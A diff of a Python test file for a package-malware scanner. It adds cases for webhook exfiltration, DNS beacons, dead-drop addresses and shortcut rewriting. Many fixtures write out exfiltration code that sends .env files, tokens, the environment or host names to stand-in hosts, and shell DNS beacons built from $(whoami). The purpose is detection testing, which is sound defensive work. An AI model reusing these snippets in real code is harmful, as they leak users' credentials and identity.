@@ -2,18 +2,18 @@
 caught and Lazaret didn't), strong wherever found — install scripts,
 import-time code, the files a package runs when used:
 
-* a chat bot or webhook whose secret is written in the code (a Telegram bot
-  token next to api.telegram.org, a Discord webhook, a Slack webhook) in a
-  file that makes network calls;
-* credential files (.env, .npmrc …) read in a file that sends data to a raw
-  public IP address;
+* a request to a webhook whose secret is written in the code (any service:
+  a Telegram bot's token, a Discord webhook's, a Slack webhook's key in the
+  URL's path, or in a name a template's hole gives it);
 * three or more credential folders named in one place (.ssh, .aws, .ethereum
   …), with network calls: a sweep of the home folder;
 * the machine's user or host name sent to an address kept base64-encoded, or
-  in a DNS lookup of a name the code builds; its public IP address sent to a
-  data-capture service (an ngrok tunnel's own address counts as one);
-* a copy of the whole environment serialized (`d = dict(os.environ)` …
-  `urlencode(d)`), read by the harvest test;
+  in a DNS lookup of a name the code builds;
+* at import time, local data read as a flow (a credential file, the host
+  name, the public IP address a lookup service answers, the whole
+  environment) sent to a data-capture service (an ngrok tunnel's own address
+  counts as one) or a raw public IP address: the list is where the data
+  goes, not a sign on its own;
 * a reverse shell given as an argument list, or to an ngrok TCP address;
 * a cryptocurrency miner (a Monero wallet address and a pool's arguments);
 * curl or wget given `-o path` in an argument list, and the file run with
@@ -21,20 +21,34 @@ import-time code, the files a package runs when used:
 * at install time, a raw socket to a hard-coded address, and browser
   shortcuts rewritten to load an extension.
 
+0.1.8 (the backlog's "what the exfiltration shapes don't read"):
+
+* the DNS beacon's name built outside an f-string or a template literal —
+  a sum, a %-format or a str.format(), a name assigned one of those, a
+  lookup command written in code — or in a shell command whose host holds
+  `$(whoami)`, $USER, %USERNAME% … (a reserved domain, .local or .internal,
+  is a machine looking itself up);
+* a dead drop: the host name sent to an address the code fetched at run
+  time from a hard-coded URL (data-pipeline-check's webhooks);
+* the host name read through require('os') or a name imported from it
+  (@helpcentre/tesco-help: `require('os').hostname()`).
+
 Each has crafted look-alikes that stay quiet. The secrets are fake and built
 here rather than written out whole; hosts are .invalid or TEST-NET; nothing
-runs. The npm engine is held to the same answers by
-tests/architecture/test_js_parity_hooks.py.
+runs. The native engine (which the npm package runs) is held to its
+recorded outputs by tests/architecture/test_snapshot_signs.py.
 """
 import unittest
 
 from tests import _support  # noqa: F401
-from lazaret.scanner import core
+from lazaret.scanner import core, engine
+
+HOST_INFO = engine.pack_pattern("_HOST_INFO_RE")
 
 TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
 DISCORD = ("discord.com/api/webhooks/" + "123456789012345678/"
            + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-_aBcDeFgHiJkLmNoPqRsTuVwXyZ01")
-SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuVwX"
+SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuV12"
 XMR = "4" + ("AbCdEfGhJk" * 10)[:94]
 
 
@@ -43,26 +57,40 @@ def on_import(text, lang="py"):
     return reasons, core.import_time_severity(reasons) if reasons else None
 
 
-class ChatSecretTests(unittest.TestCase):
+WEBHOOK = "sends data to a webhook whose secret is written in the code ({})"
+
+
+class WebhookSecretTests(unittest.TestCase):
+    """0.1.8: any service's webhook (0.1.7 knew Telegram's, Discord's and
+    Slack's shapes): a credential in the path of a URL a request is given."""
+
     def test_a_telegram_bot_token_in_the_code(self):
         text = ("import requests\nTOKEN = '" + TG + "'\ndef initialize():\n"
                 "    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument', files={'document': open(z, 'rb')})\n")
-        self.assertEqual(on_import(text), (["sends data to a Telegram bot whose token is written in the code "
-                                            "(bot 123456789)"], "CRITICAL"))
+        self.assertEqual(on_import(text), ([WEBHOOK.format("api.telegram.org")], "CRITICAL"))
         inline = "import requests\nrequests.get(f'https://api.telegram.org/bot" + TG + "/sendMessage?text={m}')\n"
         self.assertEqual(on_import(inline)[1], "CRITICAL")
         shell = "const { exec } = require('child_process');\nconst T = '" + TG + "';\n" \
                 "exec(`curl -s \"https://api.telegram.org/bot${T}/sendMessage?chat_id=1&text=${t}\"`);\n"
         self.assertEqual(on_import(shell, "js")[1], "CRITICAL")
-        self.assertIn("sends data to a Telegram bot whose token is written in the code (bot 123456789)",
-                      core.install_script_risk(text))
+        self.assertEqual(core.install_script_risk(text), [WEBHOOK.format("api.telegram.org"),
+                                                          "contacts an address typical of data exfiltration "
+                                                          "(api.telegram.org)"])
 
     def test_discord_and_slack_webhooks(self):
         self.assertEqual(on_import("const u = 'https://" + DISCORD + "';\nfetch(u, { method: 'POST' });\n", "js"),
-                         (["sends data to a Discord webhook whose token is written in the code "
-                           "(webhook 123456789012345678)"], "CRITICAL"))
+                         ([WEBHOOK.format("discord.com")], "CRITICAL"))
         self.assertEqual(on_import("var webhookUrl = 'https://" + SLACK + "';\nawait fetch(webhookUrl, {});\n", "js"),
-                         (["sends data to a Slack webhook whose key is written in the code (TABCDEF12)"], "CRITICAL"))
+                         ([WEBHOOK.format("hooks.slack.com")], "CRITICAL"))
+
+    def test_any_service_and_the_scripts_own_wrapper(self):
+        key = "Zx9" + "Qw7Er5Ty3Ui1Op0As2Df4Gh6"
+        wrapper = ("import requests\nHOOK = 'https://hooks.x.invalid/in/" + key + "'\n"
+                   "def send(url, payload):\n    return requests.post(url, json=payload)\n"
+                   "send(HOOK, {'m': 1})\n")
+        self.assertEqual(on_import(wrapper), ([WEBHOOK.format("hooks.x.invalid")], "CRITICAL"))
+        xhr = ("const x = new XMLHttpRequest();\nx.open('POST', 'https://in.x.invalid/w/" + key + "');\nx.send(d);\n")
+        self.assertEqual(on_import(xhr, "js"), ([WEBHOOK.format("in.x.invalid")], "CRITICAL"))
 
     def test_quiet_without_a_secret_or_network_calls(self):
         for text in (
@@ -77,17 +105,23 @@ class ChatSecretTests(unittest.TestCase):
                 "import requests\nrequests.post('https://hooks.slack.com/services/T00000000/B00000000/" + "X" * 24 + "')\n",
                 "import requests\nrequests.post('https://hooks.slack.com/services/T0000/B0000/abc')\n",
                 "import requests\nrequests.post('https://discord.com/api/webhooks/{id}/{token}')\n",
-                "import requests\nT = '123456789:AA" + "A" * 33 + "'\nrequests.post('https://api.telegram.org/bot' + T)\n"):
+                "import requests\nT = '123456789:AA" + "A" * 33 + "'\nrequests.post('https://api.telegram.org/bot' + T)\n",
+                # a path of words, a slug, a hash, a document's id not requested
+                "import requests\nrequests.post('https://x.invalid/api/v2/GetUserProfileInformation')\n",
+                "import requests\nrequests.get('https://x.invalid/blog/my-project-release-notes-2024')\n",
+                "import requests\nrequests.get('https://x.invalid/c/3f2a1b4c5d6e7f8091a2b3c4d5e6f708')\n",
+                "DOC = 'https://docs.x.invalid/d/" + "Zx9Qw7Er5Ty3Ui1Op0As2Df4Gh6" + "/edit'\n"):
             with self.subTest(text[:60]):
                 self.assertEqual(on_import(text)[0], [])
 
 
 class CredentialTests(unittest.TestCase):
     def test_credential_files_sent_to_an_ip_address(self):
+        # (0.1.8: the file's flow into the request, and the address it goes to)
         text = ("const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
                 "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n"
                 "const n = fs.readFileSync('~/.npmrc', 'utf8');\n")
-        self.assertEqual(on_import(text, "js"), (["reads credential files and sends data to an IP address "
+        self.assertEqual(on_import(text, "js"), (["reads local files and sends them to an IP address "
                                                    "(203.0.113.9)"], "CRITICAL"))
 
     def test_a_sweep_of_credential_folders(self):
@@ -128,6 +162,7 @@ class HostAndAddressTests(unittest.TestCase):
         self.assertEqual(on_import(js, "js")[1], "CRITICAL")
 
     def test_the_public_ip_address_to_a_capture_service(self):
+        # (0.1.8: what a lookup service answers is the machine's public IP address, a local datum)
         text = ("import threading, os, platform, requests\ndef _notify():\n"
                 "    ip = requests.get('https://api.ipify.org', timeout=2).text\n"
                 "    requests.post('https://webhook.site/0000-1111', json={'os': platform.platform(), 'ip': ip})\n"
@@ -150,9 +185,115 @@ class HostAndAddressTests(unittest.TestCase):
                 # a public IP address looked up for a mirror, no capture service
                 "import requests\nip = requests.get('https://ipinfo.io/json').json()\nrequests.get(MIRRORS[ip['country']])\n",
                 # ngrok's own API and a client that names the service
-                "import socket, requests\nh = socket.gethostname()\nrequests.get('https://api.ngrok.com/tunnels')\n"):
+                "import socket, requests\nh = socket.gethostname()\nrequests.get('https://api.ngrok.com/tunnels')\n",
+                # the host name and a capture service in one file, the host name not sent (0.1.7 made this CRITICAL)
+                "import socket, requests\nh = socket.gethostname()\nprint(h)\nrequests.get('https://webhook.site/x')\n"):
             with self.subTest(text[:60]):
                 self.assertEqual(on_import(text)[0], [])
+
+
+class BuiltNamesAndDeadDropTests(unittest.TestCase):
+    """0.1.8: the DNS beacon's name built outside a template, a dead drop, the
+    host name through require('os')."""
+    DNS = "sends the machine's user or host name in a DNS lookup of a name it builds"
+
+    def test_names_built_in_code(self):
+        for text, lang in (
+                ("const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\n"
+                 "dns.lookup(h + '.u.x.invalid.com', () => {});\n", "js"),
+                ("const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.x.invalid.com';\n"
+                 "dns.resolve(q, () => {});\n", "js"),
+                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n", "py"),
+                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n", "py"),
+                ("import socket, getpass\nh = socket.gethostname()\nq = f'{h}.{getpass.getuser()}.x.invalid.com'\n"
+                 "socket.getaddrinfo(q, 80)\n", "py"),
+                ("import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n", "py"),
+                ("import os, socket\nh = socket.gethostname()\nos.system(f'ping -c 1 {h}.x.invalid.com')\n", "py")):
+            with self.subTest(text=text):
+                reasons, sev = on_import(text, lang)
+                self.assertIn(self.DNS, reasons)
+                self.assertEqual(sev, "CRITICAL")
+
+    def test_names_built_in_a_shell_command(self):
+        for cmd in ("nslookup $(whoami).$(hostname).x.invalid.com", "ping -c 1 `whoami`.x.invalid.com",
+                    "curl -s http://$(whoami).x.invalid.com/p", "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com",
+                    "dig $USER.x.invalid.com", "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com"):
+            with self.subTest(cmd=cmd):
+                self.assertIn(self.DNS, core.install_script_risk(cmd))
+
+    def test_quiet_look_alikes(self):
+        # a machine looking itself up; a reserved domain; an assignment, not a lookup; the identity in a
+        # path; a service record of a zone; constants only
+        for text in ("import socket\nip = socket.gethostbyname(socket.gethostname())\n",
+                     "import socket\nip = socket.gethostbyname(socket.gethostname() + '.local')\n",
+                     "const os = require('os'), dns = require('dns');\ndns.lookup(os.hostname() + '.internal', cb);\n",
+                     "ping -c 1 $(hostname).local", "host=$(hostname).x.invalid.com",
+                     "curl -s http://x.invalid.com/$(whoami)",
+                     "const os = require('os'), dns = require('dns');\ndns.resolveSrv('_http._tcp.' + zone, cb);\n"
+                     "os.hostname();\n",
+                     "import socket\nh = socket.gethostname()\nsocket.gethostbyname('api' + '.x.invalid.com')\n"):
+            with self.subTest(text=text):
+                self.assertEqual(core.dns_beacon_at(text, HOST_INFO.search(text) is not None), -1)
+
+    def test_a_dead_drop(self):
+        want = "sends the machine's user or host name to an address it fetches at run time (from {})"
+        for text, lang, host in (
+                ("import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
+                 "requests.post(cfg['url'], json={'h': socket.gethostname()})\n", "py", "pastebin.com"),
+                ("import json, socket, urllib.request\n_W = None\ndef hooks():\n    global _W\n"
+                 "    req = urllib.request.Request('https://x.github.io/c.json')\n"
+                 "    cfg = json.loads(urllib.request.urlopen(req).read())\n    _W = cfg.get('webhooks', [])\n"
+                 "    return _W\ndef send():\n    for w in hooks()[:2]:\n        urllib.request.urlopen("
+                 "urllib.request.Request(w, data=socket.gethostname().encode(), method='POST'))\n", "py", "x.github.io"),
+                ("const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => "
+                 "fetch(c.hook, { method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n", "js",
+                 "x.github.io"),
+                ("const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
+                 "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, "
+                 "{ h: os.hostname() }); })();\n", "js", "gist.githubusercontent.com"),
+                ("const os = require('os'), https = require('https');\nconst CFG = 'https://x.github.io/c.json';\n"
+                 "https.get(CFG, (res) => { let b = ''; res.on('data', (d) => b += d); res.on('end', () => { "
+                 "const c = JSON.parse(b); const r = https.request(c.url, { method: 'POST' }); r.write(os.hostname()); "
+                 "r.end(); }); });\n", "js", "x.github.io")):
+            with self.subTest(text=text):
+                reasons, sev = on_import(text, lang)
+                self.assertIn(want.format(host), reasons)
+                self.assertEqual(sev, "CRITICAL")
+                self.assertIn(want.format(host), core.install_script_risk(text))
+
+    def test_dead_drop_look_alikes(self):
+        # a GET of the address; a literal address; a fetch of no literal URL; an update check; an Express
+        # route; no host name read
+        for text in ("import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
+                     "requests.get(cfg['url'])\nsocket.gethostname()\n",
+                     "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
+                     "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
+                     "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
+                     "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
+                     "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json())"
+                     ".then((j) => { if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n",
+                     "const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json())"
+                     ".then((c) => { app.post(c.path, h); });\nos.hostname();\n"):
+            with self.subTest(text=text):
+                self.assertIsNone(core.dead_drop_at(text))
+        quiet = ("import requests\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
+                 "requests.post(cfg['url'], json={'v': 1})\n")
+        self.assertIsNotNone(core.dead_drop_at(quiet))                 # the shape, but no host name read:
+        self.assertEqual(on_import(quiet), ([], None))                  # not a sign
+
+    def test_the_host_name_through_require_os(self):
+        for text in ("const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
+                     "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
+                     "const { hostname, platform } = require('os');\n"
+                     "fetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
+                     "import { userInfo } from 'node:os';\nfetch('https://x.invalid/', { method: 'POST', "
+                     "body: userInfo().username });\n",
+                     "from socket import gethostname\nimport requests\nrequests.post('https://x.invalid/', "
+                     "data=gethostname())\n"):
+            with self.subTest(text=text):
+                self.assertIn("sends the machine's user or host name over the network", core.install_script_risk(text))
+        self.assertEqual(core.install_script_risk("const { a, b } = require('os');\nfetch('https://x.invalid/');\n"),
+                         [])
 
 
 class RequestBinTests(unittest.TestCase):
@@ -173,8 +314,12 @@ class RequestBinTests(unittest.TestCase):
         for host in ("requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"):
             with self.subTest(host):
                 text = f"const https = require('https');\nhttps.get('https://{host}/r/abc?d=' + process.env.NPM_TOKEN);\n"
+                # (0.1.8: a token in a request's address counts where the address is a capture service's)
                 self.assertEqual(core.install_script_risk(text),
-                                 [f"contacts an address typical of data exfiltration ({host.split('x.')[-1]})"])
+                                 ["sends environment variables over the network (NPM_TOKEN)",
+                                  f"contacts an address typical of data exfiltration ({host.split('x.')[-1]})"])
+        mirror = "const https = require('https');\nhttps.get('https://mirror.x.invalid/d?t=' + process.env.NPM_TOKEN);\n"
+        self.assertEqual(core.install_script_risk(mirror), [])
         beacon = ("import socket, requests\n"
                   "requests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n")
         self.assertEqual(on_import(beacon), (["sends the machine's user or host name to a data-capture service "
@@ -188,10 +333,23 @@ class EnvironmentCopyTests(unittest.TestCase):
                 "    url = 'https://5cecdbdb.ngrok.app/collect'\n"
                 "    urllib.request.urlopen(urllib.request.Request(url, data=encoded))\n")
         self.assertEqual(on_import(text), (["reads credentials or the whole environment and sends them to an "
-                                            "exfiltration service (ngrok)"], "CRITICAL"))
+                                            "exfiltration service (5cecdbdb.ngrok.app)"], "CRITICAL"))
         js = "const https = require('https');\nconst e = { ...process.env };\nconst body = JSON.stringify(e);\nhttps.request(o).end(body);\n"
         self.assertEqual(on_import(js, "js"), (["reads credentials or the whole environment and sends data over the "
-                                                 "network"], "MAJOR"))
+                                                 "network"], "CRITICAL"))         # 2.17: sent anywhere
+
+    def test_the_bytes_environment(self):
+        # 2.17: os.environb is the environment too, and a variable read from
+        # it is one variable, as from os.environ (pyarmor reads its proxy
+        # setting with os.environb.get(b'http_proxy'))
+        send = "import os, requests\nrequests.post('https://x.invalid/c', data=%s)\n"
+        self.assertEqual(core.local_data_sent_at(send % "dict(os.environb)")[1:3],
+                         ("environment", "the whole environment"))
+        self.assertEqual(on_import(send % "dict(os.environb)")[1], "CRITICAL")
+        for one in ("os.environb.get(b'EXAMPLE_TOKEN')", "os.environb[b'EXAMPLE_TOKEN']", "os.getenvb(b'EXAMPLE_TOKEN')"):
+            with self.subTest(one):
+                self.assertEqual(core.local_data_sent_at(send % one)[1:3], ("environment", "EXAMPLE_TOKEN"))
+                self.assertEqual(on_import(send % one)[0], [])
 
     def test_a_copy_handed_to_a_subprocess_is_not_a_harvest(self):
         text = ("import os, subprocess, requests\nenv = dict(os.environ)\nenv['PATH'] = '/opt/bin'\n"
@@ -246,6 +404,17 @@ class BoundedWorkTests(unittest.TestCase):
             "reverse shell args": "'nc'" + " '-x'," * 50000,
             "monero": "'-o' exec(" + ("4" + "a" * 93 + "! ") * 5000,
             "a long line": "getaddrinfo(f\"" + "{a}." * 50000 + "\n",
+            "dead drop fetches": "import socket\nsocket.gethostname()\n"
+                                 + "c = requests.get('https://x.invalid/c').json()\n" * 5000
+                                 + "requests.post(c['u'], data=1)\n" * 5000,
+            "dead drop chains": "const os = require('os');\nos.hostname();\nfetch('https://x.invalid/c')"
+                                + ".then((r) => r)" * 50000 + "\n",
+            "dead drop one line": "import socket\nsocket.gethostname()\nc = urlopen('https://x.invalid/c')\nx = c"
+                                  + " + c" * 200000 + "\n",
+            "dns assigned names": "import socket\nsocket.gethostname()\n" + "q = h + '.x.invalid.com'\n" * 20000
+                                  + "socket.gethostbyname(q)\n" * 20000,
+            "dns shell identities": "nslookup " + "$(whoami)" * 100000 + "\n" + "echo "
+                                    + "$(whoami).x.invalid.com " * 50000,
         }
         for label, text in texts.items():
             with self.subTest(label):
@@ -270,13 +439,21 @@ class InstallTimeTests(unittest.TestCase):
         # not at import time: a client connects to addresses
         self.assertEqual(on_import(setup)[0], [])
 
-    def test_browser_shortcuts_rewritten(self):
+    def test_shortcuts_rewritten(self):
+        """0.1.8: the shortcuts a machine has, found and changed — whatever
+        they are made to start (python-dateuti: a browser extension)."""
+        reason = "rewrites the shortcuts of programs on the machine"
         setup = ("from win32com.client import Dispatch\nshell = Dispatch('WScript.Shell')\n"
                  "for f in files:\n    if f.endswith('.lnk'):\n        s = shell.CreateShortcut(root + f)\n"
                  "        s.Arguments = '--load-extension={p}\\\\Extension'\n        s.Save()\n")
-        self.assertIn("rewrites browser shortcuts to load an extension", core.install_script_risk(setup))
+        self.assertIn(reason, core.install_script_risk(setup))
+        self.assertIn(reason, core.install_script_risk(setup.replace("'--load-extension={p}\\\\Extension'", "'/c x.exe'")))
+        self.assertIn(reason, core.install_script_risk(
+            "for (const f of glob.sync('*.lnk')) { const s = sh.CreateShortcut(f); s.TargetPath = exe; s.Save(); }"))
         selenium = "from selenium import webdriver\no = webdriver.ChromeOptions()\no.add_argument('--load-extension=ext')\n"
-        self.assertNotIn("rewrites browser shortcuts to load an extension", core.install_script_risk(selenium))
+        self.assertNotIn(reason, core.install_script_risk(selenium))
+        own = ("s = shell.CreateShortcut(os.path.join(desktop, 'MyApp.lnk'))\ns.TargetPath = exe\ns.Save()\n")
+        self.assertNotIn(reason, core.install_script_risk(own))     # an installer's own shortcut
 
 
 if __name__ == "__main__":
